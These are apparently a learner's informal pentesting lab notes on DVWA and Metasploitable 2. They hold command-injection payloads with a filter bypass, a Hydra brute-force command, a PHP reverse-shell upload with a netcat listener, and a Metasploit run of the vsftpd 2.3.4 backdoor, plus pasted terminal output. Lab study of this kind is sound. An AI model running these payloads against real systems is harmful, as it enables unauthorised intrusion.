
arp-scan -l 
web god
`locate webshell` - to find a php reverse shell

checking the uploaded file

![](attachments/Pasted%20image%2020260728115700.png)

create a listener 
netcat -lvnp 1234 (normally as the default port 1234 is used as )

click upload and change the extion again back to php from burl and foarward and go to the hackable/upload and click the php file and we get the reverse shell from the listener


## Command execution 

### Low Level

```
ping 8.8.8.8 : ls
```

`&&` ensures the second command only runs if the first succeeds.

```
8.8.8.8 && ls
```
`&` runs `whoami` in the background alongside `ping`.

```
8.8.8.8 & whoami
```

### Medium Level
we see that some operators like `&&` and `;` are blocked.


```

8.8.8.8 | ls
```

### High level
![](attachments/Pasted%20image%2020260731111749.png)

However, when reviewing the code, we notice a subtle flaw: the filter incorrectly validates the pipe operator with a space (`|` ) instead of just the pipe symbol itself. This means an input like this still bypasses validation:


```
8.8.8.8 |ls
```

## Brute force

## low level

![](attachments/Pasted%20image%2020260731113014.png)

The SQL injection worked, and it led us to the Welcome to the password protected area message .

### Brute Force Attacks with Hydra

```
hydra -l <username> -P <password-list> <target> http-get-form "<login-form>:<login-field>^USER^&<password-field>^PASS^:F=<failed-login-string>"
```

inspect >> storage >> PHPSESSID  (91f45430a90f4b0935f02c579e29c03f)
note down that id - is essential for maintaining the session during our brute force attack.
After identifying the PHPSESSID value and the error message displayed during failed login attempts, we will reformulate the Hydra command to include these details, ensuring accurate execution of the brute force attack .

Now, we will use hydra to brute force the login with the following command :



```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.114 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=91f45430a90f4b0935f02c579e29c03f;security=low:F=Username and/or password incorrect."
```















Use NAT adapters for all

Metasploitable 2 walthrough  infosec train
https://www.infosectrain.com/blog/metasploitable-2-exploitation-walkthrough


pentest os
workstation pro - parrot os,kali
victim os
windows 7,10

vulnarable os
vulnhub
	metaspoitable 1,2 
	cybersploit 1,2
	skyDog
	Investigator
	SicOs1.2
	Golden eye
	Kioptrix 1 2 
	Escalate priviledges
TryHackMe - soc 1

![](attachments/Pasted%20image%2020260710135355.png)


go to the root
pentester lab
ctf 365
cybrary

zsh: corrupt history file /home/kali/.zsh_history
┌──(kali㉿kali)-[~]
└─$ ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 26:f8:6c:b7:5a:c5  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 6 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::278c:fd45:1105:7043  prefixlen 64  scopeid 0x20<link>
        inet6 fd00::71ef:ba7a:fcee:fbea  prefixlen 64  scopeid 0x0<global>
        ether 08:00:27:63:b0:05  txqueuelen 1000  (Ethernet)
        RX packets 17123  bytes 18471259 (17.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6146  bytes 1971612 (1.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet <192.168.56.102>  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::8ead:7be1:c958:58c3  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:18:dd:23  txqueuelen 1000  (Ethernet)
        RX packets 14  bytes 5745 (5.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 3722 (3.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                             
┌──(kali㉿kali)-[~]
└─$ ls      
BurpSuite  google-chrome-stable_current_amd64.deb  Pictures  Templates
Desktop    grep                                    Projects  Videos
Documents  Music                                   Public
Downloads  output.pcap                             results
                                                                             
┌──(kali㉿kali)-[~]
└─$ cd Downloads                            
                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
academy-regular.ovpn                           burpsuite_linux_v2026_4_3.sh
ap-south-1-hashinivihanga093-regular.ovpn      cacert.der
ap-south-1-hashinivihanga093-regular-tcp.ovpn
                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ openvpn ap-south-1-hashinivihanga093-regular.ovpn
2026-07-10 04:35:09 DEPRECATED OPTION: --persist-key option ignored. Keys are now always persisted across restarts. 
2026-07-10 04:35:09 Note: --cipher is not set. OpenVPN versions before 2.5 defaulted to BF-CBC as fallback when cipher negotiation failed in this case. If you need this fallback please add '--data-ciphers-fallback BF-CBC' to your configuration and/or add BF-CBC to --data-ciphers. E.g. --data-ciphers DEFAULT:BF-CBC
2026-07-10 04:35:10 OpenVPN 2.7.5 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2026-07-10 04:35:10 library versions: OpenSSL 3.6.3 9 Jun 2026, LZO 2.10
2026-07-10 04:35:10 DCO version: 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18)
2026-07-10 04:35:10 TCP/UDP: Preserving recently used remote address: [AF_INET]35.154.230.92:1194
2026-07-10 04:35:10 Socket Buffers: R=[212992->212992] S=[212992->212992]
2026-07-10 04:35:10 UDPv4 link local: (not bound)
2026-07-10 04:35:10 UDPv4 link remote: [AF_INET]35.154.230.92:1194
2026-07-10 04:35:13 TLS: Initial packet from [AF_INET]35.154.230.92:1194, sid=b97ad80d 7a34342d
2026-07-10 04:35:13 WARNING: this configuration may cache passwords in memory -- use the auth-nocache option to prevent this




tun 0 in ifconfig is the vpn in thm- tun for tunnel

tj null list oscp-do all the boxes



Pentest

REPORT
1st screenshot -ifconfig
should tell y i attack that specific version/vulnerability - national vulnerability database NIST 
-CVE score - wht that critical
![](attachments/Pasted%20image%2020260710150033.png)

 

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  # netmask 255.255.255.0 broadcast 10.0.2.255
        inet6 fe80::278c:fd45:1105:7043  prefixlen 64  scopeid 0x20<link>
        inet6 fd00::71ef:ba7a:fcee:fbea  prefixlen 64  scopeid 0x0<global>
        ether 08:00:27:63:b0:05  txqueuelen 1000  (Ethernet)
        RX packets 18773  bytes 18928012 (18.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7632  bytes 2252299 (2.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0



what i am getting from this- my victims machine using 192.168.2.17. something
network id- 

netdiscover -r 192.168.217.0/24 - to discover who else is in my network




OUI
192.168.10. <1> - adapter ip
192.168.10. <2> - gateway ip
192.168.10. <254> - dhcp ip

STEP 2

identify open ports
identify version

nmap <ip> -sV


STEP 3

decide which port to attack by looking to things
sometimes they hide/change the port number
eg:
it is sus ftp run in a diff port number



check any of these are exploitable
copy and put it in <exploit db -GUI Version >
<searchsploit -CMD version>
eg:
searchsploit OpenSSH 1.3.1

msfconsole

search
┌──(root㉿kali)-[~]
└─# msfconsole                     
Metasploit tip: View advanced module options with advanced
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                      
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                       
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                         
           :kk;.OOOOOOOOOOOOO.;Ok:                                           
             ;kOOOOOOOOOOOOOOOk:                                             
               ,xOOOOOOOOOOOx,                                               
                 .lOOOOOOOl.                                                 
                    ,dOd,                                                    
                      .                                                      

       =[ metasploit v6.4.135-dev                               ]
+ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor                                            

msf > use 1

[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
msf exploit(unix/ftp/vsftpd_234_backdoor) > 
msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.
                                      metasploit.com/docs/using-metasploit/
                                      basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Acc
                                              epted: CURL, FTP, TFTP, TNFTP
                                              , WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary
                                              after execution
   FETCH_FILELESS  none             yes       Attempt to run payload withou
                                              t touching disk by using anon
                                              ymous handles, requires Linux
                                               ≥3.17 (for Python variant al
                                              so Python ≥3.8, tested shells
                                               are sh, bash, zsh) (Accepted
                                              : none, python3.8+, shell-sea
                                              rch, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving p
                                              ayload
   FETCH_SRVPORT   8080             yes       Local port to use for serving
                                               payload
   FETCH_URIPATH                    no        Local URI to use for serving
                                              payload
   LHOST                            yes       The listen address (an interf
                                              ace may be specified)
   LPORT           4444             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and
                                          the command so it can be piped di
                                          rectly to the shell.


   When FETCH_FILELESS is none:

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   FETCH_FILENAME    ShVMRwEKot       no        Name to use on remote syste
                                                m when storing payload; can
                                                not contain spaces or slash
                                                es
   FETCH_WRITABLE_D  ./               yes       Remote writable dir to stor
   IR                                           e payload; cannot contain s
                                                paces


Exploit target:

   Id  Name
   --  ----
   0   Linux/Unix Command



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > SET RHOST <192.168.217.129><-----VIctim ip>
[-] Unknown command: SET. Did you mean set? Run the help command for more details.
msf exploit(unix/ftp/vsftpd_234_backdoor) > 
exploit
Exploit
shell- to get a interactive promt
id- instead of whoami
ls
LOGGED AS ROOT - DONE !!!!


Optional but Option 2 

Before we identified theres a apache server running so can copy the ip addtess 192.168.217.129 and  paste in google and look into the website

pentester monkey 



upload> 
php reverse shell - built in code in linux to get the shell
nano it and change the ip at the end of the code
remember the port 
if the security is high cant upload php so change the extention using <Burpsuit>
go to the particular location and click on the reverse shell i uploaded

in linux type
nc -lvnp <1234> <------port number>
get access



Go to the web from your kali browser. Use the IP of neighbor 
DVWA open 
Admin password , Admin  guess the password 
Then log in to it and change the security to low, then upload the document or download a file if u have downloaded it as PHP; if you can't use it, then use it as a JPG if you can't use MR.BURP as PHP, because then only we can connect it as a reverse connection; then all the traffic is navigated through the BURP, then u can upload it as a PHP 
Nc -lvnp ( port no ):  then u can log in to the back end 
Ls  to check 

